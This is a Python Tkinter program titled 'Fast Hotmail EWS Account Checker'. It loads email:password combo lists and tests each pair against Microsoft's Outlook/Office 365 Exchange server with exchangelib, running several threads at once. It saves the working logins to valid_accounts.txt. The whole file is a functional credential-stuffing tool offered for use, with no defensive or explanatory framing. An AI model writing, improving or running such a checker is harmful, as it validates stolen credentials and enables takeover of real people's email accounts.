import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk
import webbrowser
from exchangelib import Credentials, Account, DELEGATE, Configuration
import threading
import concurrent.futures

# Global counts
success_count = 0
failed_count = 0
total_accounts = 0

# Function to check login with timeout
def check_hotmail_login(email, password):
    try:
        creds = Credentials(email, password)
        config = Configuration(credentials=creds, server='outlook.office365.com')
        account = Account(email, config=config, autodiscover=False, access_type=DELEGATE)

        # Quick inbox access test
        account.root.refresh()
        return True
    except Exception as e:
        return False

# Process accounts using threading
def process_accounts(accounts):
    global success_count, failed_count, total_accounts
    success_count = 0
    failed_count = 0
    total_accounts = len(accounts)

    valid_accounts = []
    failed_accounts = []

    progress_bar["maximum"] = total_accounts
    progress_bar["value"] = 0

    def check_account(index, line):
        parts = line.strip().split(":")
        if len(parts) != 2:
            return f"⚠️ Skipping invalid line: {line}", None

        email, password = parts
        update_progress(f"🔄 Checking {index}/{total_accounts}: {email}...")

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            future = executor.submit(check_hotmail_login, email, password)
            success = future.result(timeout=15)  # Timeout after 15 seconds

        if success:
            valid_accounts.append(f"{email}:{password}")
            return f"✅ {email} (Success)", "valid"
        else:
            failed_accounts.append(f"{email}:{password}")
            return f"❌ {email} (Failed)", "failed"

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        results = executor.map(lambda args: check_account(*args), enumerate(accounts, start=1))

    for result, status in results:
        update_progress(result)
        if status == "valid":
            success_count += 1
        elif status == "failed":
            failed_count += 1
        update_summary()
        progress_bar["value"] += 1
        progress_percentage.set(f"{int((progress_bar['value'] / total_accounts) * 100)}% Completed")
        root.update_idletasks()

    with open("valid_accounts.txt", "w") as f:
        f.write("\n".join(valid_accounts))
    with open("failed_accounts.txt", "w") as f:
        f.write("\n".join(failed_accounts))

    update_progress(f"✅ Process Complete! {success_count} successful, {failed_count} failed.")
    messagebox.showinfo("Done", "Account checking finished!")

# Start processing accounts in a separate thread
def start_processing(accounts):
    if not accounts:
        messagebox.showwarning("No Accounts", "No accounts to check!")
        return

    progress_text.delete("1.0", tk.END)
    summary_label.config(text="✅ 0 Success | ❌ 0 Failed")
    threading.Thread(target=process_accounts, args=(accounts,), daemon=True).start()

# File upload function
def upload_file():
    file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    if not file_path:
        messagebox.showwarning("No File Selected", "Please select a file to proceed.")
        return
    with open(file_path, "r") as f:
        accounts = f.readlines()
    start_processing(accounts)

# Paste accounts function
def paste_accounts():
    input_text = input_box.get("1.0", tk.END).strip()
    if not input_text:
        messagebox.showwarning("No Input", "Please enter email:password list.")
        return
    accounts = input_text.split("\n")
    start_processing(accounts)

# GUI progress update
def update_progress(message):
    progress_text.insert(tk.END, message + "\n")
    progress_text.see(tk.END)

# GUI success/failure count update
def update_summary():
    summary_label.config(text=f"✅ {success_count} Success | ❌ {failed_count} Failed")

# Open valid accounts file
def open_valid_accounts():
    try:
        webbrowser.open("valid_accounts.txt")
    except Exception as e:
        messagebox.showerror("Error", f"Could not open file: {e}")

# Create GUI
def create_gui():
    global root, progress_text, input_box, summary_label, progress_bar, progress_percentage
    root = tk.Tk()
    root.title("⚡ Fast Hotmail EWS Account Checker")
    root.geometry("600x550")

    label = tk.Label(root, text="Upload or Paste Accounts (email:password)", font=("Arial", 12))
    label.pack(pady=5)

    frame = tk.Frame(root)
    frame.pack()

    upload_button = tk.Button(frame, text="📂 Upload File", command=upload_file, font=("Arial", 10), bg="lightblue")
    upload_button.pack(side=tk.LEFT, padx=10)

    paste_button = tk.Button(frame, text="✂️ Paste Accounts", command=paste_accounts, font=("Arial", 10), bg="lightgreen")
    paste_button.pack(side=tk.LEFT, padx=10)

    input_box = scrolledtext.ScrolledText(root, height=5, width=60)
    input_box.pack(pady=5)

    summary_label = tk.Label(root, text="✅ 0 Success | ❌ 0 Failed", font=("Arial", 12))
    summary_label.pack(pady=5)

    # Progress Bar
    progress_percentage = tk.StringVar()
    progress_percentage.set("0% Completed")
    progress_label = tk.Label(root, textvariable=progress_percentage, font=("Arial", 10))
    progress_label.pack()

    progress_bar = ttk.Progressbar(root, length=500, mode='determinate')
    progress_bar.pack(pady=5)

    progress_text = scrolledtext.ScrolledText(root, height=10, width=70)
    progress_text.pack(pady=5)

    open_valid_button = tk.Button(root, text="📜 View Successful Logins", command=open_valid_accounts, font=("Arial", 10), bg="lightyellow")
    open_valid_button.pack(pady=5)

    root.mainloop()

# Start GUI
create_gui()
